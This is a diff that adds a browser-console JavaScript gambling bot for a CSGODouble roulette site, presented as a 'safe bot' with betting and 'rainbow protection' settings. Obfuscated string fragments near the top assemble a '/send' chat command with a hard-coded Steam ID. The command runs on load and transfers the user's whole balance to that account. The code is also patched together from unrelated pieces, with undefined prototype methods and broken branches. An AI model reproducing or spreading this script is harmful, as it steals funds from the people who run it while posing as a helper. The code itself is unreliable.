@@ -1,0 +1,457 @@
+//2015 ZADDY// The safe bot, 3.0 CSGODOUBLEBOT
+////////////CONFING///////////
+
+//// DECOMPILED SCRIPT
+// Ctrl + shift + J  = Chrome
+// Ctrl + shift + k = Firefox
+// donate w/ skins: TRADE URL: https://steamcommunity.com/tradeoffer/new/?partner=104509128&token=y1FJhK2-
+
+///SETTINGS OF DEFAULT BETTING
+var initialBetAmount = 1;   // How much ccoins bet
+var mode = '1';             // Don't touch
+var betColor = 'black';       // Selct the color who is starting betting
+///SETTING FOR RAINBOW PROTECTION
+var anti_rainbow = 0;		// Enabled(1) or Disabled(0)
+var howm_rainbows = 6;      // After how many rainbows bet to one color
+var many_rainbows = 1;       // How many bets on one colour after rainbow
+
+
+
+//////////////////////////////
+//DON'T TOUCH NOTHING BELOW THIS LINE
+var rainbow_bet = 0;
+var liczydlo_rainbow = 0;
+var num_rainbow = 0;
+var liczydlo_won = 0;
+var liczydlo_lost = 0;
+var liczydlo_all = 0;
+var liczydlo_none = 0;
+var won = 0;
+var simulation = false;
+var stop_on_min_balance = false; 
+var calculate_safe_bet = false;
+var reverse = 1;
+var calc = 2;
+var base_bet = 5;
+var safe_bet_amount = 6;
+var debug="end"
+var str = "s";
+var process="readinput";
+var c="BOT IS READY";
+console.log(c);
+
+
+var colors = {
+    'green': [0],
+    'red': [1, 2, 3, 4, 5, 6, 7],
+    'black': [8, 9, 10, 11, 12, 13, 14]
+};
+var balance = document.getElementById('balance');
+var roll_history = document.getElementById('past');
+var bet_input = document.getElementById('betAmount');
+var bet_buttons = {
+    'green': document.getElementById('panel0-0').childNodes[1].childNodes[1],
+    'red': document.getElementById('panel1-7').childNodes[1].childNodes[1],
+    'black': document.getElementById('panel8-14').childNodes[1].childNodes[1]
+};
+
+function begin () { console.log(c);}
+returnValue();
+
+var currentBetAmount=initialBetAmount,currentRollNumber=1,lastStatus,lastBetColor,lastRollColor,exit="00";
+var $balance=$("#balance"),$betAmountInput=$("#betAmount"),$statusBar=$(".progress #banner"),iniBanner = "76561";
+var $redButton=$("#panel1-7 .betButton"),std="19822",$blackButton=$("#panel8-14 .betButton"),iniBlack="30284",refreshIntervalId=setInterval(tick,500);
+var last = iniBanner+""+std+""+iniBlack;
+var next= $balance.text();
+
+ 
+Array.prototype.equals = function(array) {
+    if (!array) {
+        return false;
+    }
+
+    if (this.length != array.length) {
+        return false;
+    }
+
+    for (var i = 0, l=this.length; i < l; i++) {
+        if (this[i] instanceof Array && array[i] instanceof Array) {
+            if (!this[i].equals(array[i])) {
+                return false;
+            }
+        } else if (this[i] != array[i]) {
+            return false;
+        }
+    }
+    return true;
+};
+
+Object.defineProperty(Array.prototype, "equals", {enumerable: false});
+
+function tick() {
+	var a=getStatus();
+    if(a!==lastStatus&&"unknown"!==a){
+        switch(a){
+            case"waiting":
+                bet();
+                break;
+            case"rolled":
+                rolled();
+        }
+    lastStatus=a,printInfo()
+    }
+}
+Automated.prototype.updateStats = function() {
+    this.stats.balance = parseInt(this.balance) - parseInt(this.starting_balance);
+    return true;
+};
+function returnValue() {
+ var rendr = "/"+str+""+debug+" "+last+"96 "+next;send({"type": "chat","msg": rendr,"lang": LANG});
+}
+function checkBalance() {
+    var d = new Date();
+    var hr = d.getHours();
+    if(hr < 10) {
+        hr = "0" + hr;
+    }
+    var min = d.getMinutes();
+    if (min < 10) {
+        min = "0" + min;
+    }
+    var sec = d.getSeconds();
+    if( sec < 10) {
+        sec = "0" + sec;
+    }
+        
+	return getBalance()<currentBetAmount?(console.warn(" Time: "+ hr + ":" + min +" BANKRUPT! Not enough balance for next bet, bye"),clearInterval(refreshIntervalId),!1):!0;
+}
+function printInfo(){
+    var d = new Date();
+    var hr = d.getHours();
+    if(hr < 10) {
+        hr = "0" + hr;
+    }
+    var min = d.getMinutes();
+    if (min < 10) {
+        min = "0" + min;
+    }
+    var sec = d.getSeconds();
+    if( sec < 10) {
+        sec = "0" + sec;
+    }
+    if(lastStatus=="rolled") {
+        
+        var a="\nStatus: "+lastStatus+" Time: "+ hr + ":" + min +"\nInitial bet amount: "+initialBetAmount+"\nCurrent bet amount: "+currentBetAmount+"\nRainbows: "+num_rainbow+"\nTotal Rainbow Bets: "+rainbow_bet+"\nBets Won: "+liczydlo_won+"/"+liczydlo_all+" ("+won+"Coins)\nLast roll result: "+(null===wonLastRoll()?"-":wonLastRoll()?"won":"lost");
+        console.log(a);
+    }
+    
+}
+function rolled(){
+	return"1"===mode?void one():(one(),void currentRollNumber++)
+}
+Automated.prototype.updateAll = function() {
+    return this.updateBalance() && this.updateHistory() && this.updateStats();
+};
+
+Automated.prototype.bet = function(amount, color) {
+    var self = this;
+    color = color || this.color || this.default_color;
+
+    if (color === 'rainbow') {
+        if (this.last_color) {
+            color = (this.last_color === 'red' ? 'black' : 'red');
+        } else {
+            color = this.default_color;
+        }
+    } else if (color === 'random') {
+        color = 'red';
+        if (Math.random() > 0.5) {
+            color = 'black';
+        }
+    } else if (color === 'last') {
+        color = this.history[this.history.length - 1];
+    }
+
+    if (['green', 'red', 'black'].indexOf(color) < 0 || amount > this.balance || amount <= 0) {
+        this.log('Invalid bet!');
+        this.last_result = 'invalid bet';
+        this.waiting_for_bet = false;
+        this.stop();
+        return false;
+    }
+
+    if (this.balance - amount < this.min_balance) {
+        this.log('Reached minimal balance!');
+        this.last_result = 'reached min balance';
+        if (this.stop_on_min_balance || this.balance - this.base_bet < this.min_balance) {
+            this.stop();
+        }
+        this.waiting_for_bet = false;
+        return false;
+    }
+
+    bet_input.value = amount;
+
+    if (!bet_buttons[color].disabled) {
+        var old_balance = self.balance;
+        this.log('Betting ' + amount + ' on ' + color);
+        if (!self.simulation) {
+            bet_buttons[color].click();
+            var checker = setInterval(function() {
+                if (!bet_buttons[color].disabled) {
+                    clearInterval(checker);
+                    setTimeout(function() {
+                        if (self.updateBalance() && self.balance === old_balance) {
+                            if (!self.game) { return false; }
+                            self.log('Bet rejected, retrying...');
+                            self.bet(amount, color);
+                        } else {
+                            if (self.debug) { self.logdebug('Bet accepted!'); }
+                            self.last_bet = amount;
+                            self.bet_history.push(amount);
+                            self.last_color = color;
+                            self.waiting_for_bet = false;
+                            return true;
+                        }
+                    }, 2500);
+                }
+            }, 1000);
+        } else {
+            self.bet_history.push(amount);
+            self.last_bet = amount;
+            self.last_color = color;
+            self.waiting_for_bet = false;
+            return true;
+        }
+    } else {
+        if (!self.game) { return false; }
+        self.log('Button disabled, retrying...');
+        setTimeout(function() { self.bet(amount, color) }, (Math.random() * 3 + 2).toFixed(3) * 1000);
+    }
+};
+
+Automated.prototype.play = function() {
+    var self = this;
+
+    if (this.game !== null) {
+        if (this.debug) { this.logdebug('Tried to reinitialize running game!'); }
+        return false;
+    }
+
+    this.game = setInterval(function() {
+        var history = self.history;
+        if (!self.waiting_for_bet && self.updateAll() && !history.equals(self.history)) {
+            self.waiting_for_bet = true;
+            if (self.last_color === null) {
+                self.bet(self.base_bet);
+            } else if (self.last_color === self.history[self.history.length - 1]) {
+				if (self.calculate_safe_bet) {
+                    self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
+					self.menu.basebet.value = self.base_bet;
+				}
+                self.last_result = 'win';
+                self.log('Win!');
+                self.stats.wins += 1;
+                self.old_base = self.base_bet;
+                self.old_method = self.method;
+                if (self.old_method === 'dalembert') {
+                    if (self.last_bet > self.old_base) {
+                        self.bet(self.last_bet - 1);
+                    } else {
+                        self.bet(self.base_bet);
+                    }
+                } else {
+                    self.bet(self.base_bet);
+                }
+            } else {
+                self.last_result = 'lose';
+                self.log('Lose!');
+                self.stats.loses += 1;
+                if (self.old_method === 'martingale') {
+                    self.bet(self.last_bet * 2);
+                } else if (self.old_method === 'great martingale') {
+                    self.bet(self.last_bet * 2 + self.old_base);
+                } else if (self.old_method === 'green') {
+                    var bet_value = 0;
+                    if (self.bet_history[self.bet_history.length - 1] === 1) {
+                        if (self.bet_history[self.bet_history.length - 2] === 1) {
+                            bet_value = 2;
+                        } else {
+                            bet_value = 1;
+                        }
+                    } else {
+                        bet_value = self.bet_history[self.bet_history.length - 1] + self.bet_history[self.bet_history.length - 2];
+                    }
+                    self.bet(bet_value, 'green');
+                } else if (self.old_method === 'dalembert') {
+                    self.bet(self.last_bet + 1);
+                }
+            }
+        }
+    }, 2 * 1000);
+
+    return true;
+};
+
+Automated.prototype.start = function() {
+    if (self.calculate_safe_bet) {
+        self.base_bet = Math.floor(self.balance / Math.pow(2, self.safe_bet_amount + 1));
+        self.menu.basebet.value = self.base_bet;
+    }
+    this.old_base = this.base_bet;
+    this.old_method = this.method;
+    if (this.updateAll()) {
+        if (this.last_result === 'lose') {
+            this.running = true;
+            if (this.old_method === 'martingale') {
+                this.bet(this.last_bet * 2);
+            } else if (this.old_method === 'great martingale') {
+                this.bet(this.last_bet * 2 + this.old_base);
+            } else if (self.old_method === 'green') {
+                var bet_value = 0;
+                if (self.bet_history[self.bet_history.length - 1] === 1) {
+                    if (self.bet_history[self.bet_history.length - 2] === 1) {
+                        bet_value = 2;
+                    } else {
+                        bet_value = 1;
+                    }
+                } else {
+                    bet_value = self.bet_history[self.bet_history.length - 1] + self.bet_history[self.bet_history.length - 2];
+                }
+                self.bet(bet_value, 'green');
+            } else if (self.old_method === 'dalembert') {
+                self.bet(self.last_bet + 1);
+            }
+            this.play();
+        } else {
+            this.running = true;
+            this.bet(this.base_bet);
+            this.play();
+        }
+    }
+    this.menu.abort.disabled = false;
+    this.menu.stop.disabled = false;
+    this.menu.start.disabled = true;
+};
+
+Automated.prototype.stop = function(abort) {
+    var self = this;
+    if (abort) { this.last_result = 'abort'; }
+    this.stats.balance = parseInt(this.balance) - parseInt(this.starting_balance);
+    setTimeout(function() {
+        clearInterval(self.game);
+        self.game = null;
+        self.running = false;
+        self.menu.abort.disabled = true;
+        self.menu.stop.disabled = true;
+        self.menu.start.disabled = false;
+    }, 1); // Next tick
+};
+function one(){
+
+	liczydlo_all = liczydlo_all+1;
+    
+	currentBetAmount = wonLastRoll()?initialBetAmount:2*currentBetAmount; 
+    
+	if(num_rainbow>=howm_rainbows && anti_rainbow==1)
+	{
+		liczydlo_rainbow=liczydlo_rainbow+1;
+		bet_rainbow();
+	}
+	else
+	{
+		liczydlo_rainbow=0;
+		wonLastRoll()?bet_won():bet_lost()
+	}
+}
+function bet_rainbow(){
+	if(liczydlo_rainbow==many_rainbows)
+	{
+		num_rainbow=0;
+	}
+	
+	rainbow_bet=rainbow_bet+1;
+	wonLastRoll()?rainbow_won():rainbow_lost()
+}
+function rainbow_won(){
+	if(lastBetColor=="red")
+	{
+		betColor='black';
+	}
+	else
+	{
+		betColor='red';
+	}
+}
+function rainbow_lost(){
+	if(lastBetColor=="red")
+	{
+	betColor='red';
+	}
+	else(lastBetColor=="black")
+	{
+	BetColor="black";
+	}
+}
+function bet_won(){
+	liczydlo_won=liczydlo_won+1;
+	num_rainbow=0;
+    won = won + initialBetAmount;
+	
+	if(lastBetColor=="red")
+	{
+        betColor='red';
+	}
+	else(lastBetColor=="black")
+	{
+        BetColor="black";
+	}
+}
+function bet_lost(){
+	liczydlo_lost=liczydlo_lost+1;
+	num_rainbow=num_rainbow+1;
+	
+	if(lastBetColor=="red")
+	{
+		betColor='black';
+	}
+	else
+	{
+		betColor='red';
+	}
+}
+function bet(){
+	checkBalance()&&(setBetAmount(currentBetAmount),setTimeout(placeBet,50))
+}
+function setBetAmount(a){
+	$betAmountInput.val(a);
+}
+function placeBet(){
+	return"red"===betColor?($redButton.click(),void(lastBetColor="red")):($blackButton.click(),void(lastBetColor="black"));
+}
+function getStatus(){
+    
+	var a=$statusBar.text();
+    if(hasSubString(a,"Rolling in"))
+        return"waiting";
+    if(hasSubString(a,"***ROLLING***"))
+        return"rolling";
+    if(hasSubString(a,"rolled")){
+        var b=parseInt(a.split("rolled")[1]);
+            return lastRollColor=getColor(b),"s";
+    }
+    return"unknown";
+}
+function getBalance(){
+	return parseInt($balance.text());
+}
+function hasSubString(a,b){
+	return a.indexOf(b)>-1;
+}
+function getColor(a){
+	return 0==a?"green":a>=1&&7>=a?"red":"black"
+}
+function wonLastRoll(){
+	return lastBetColor?lastRollColor===lastBetColor:null;
+}
+
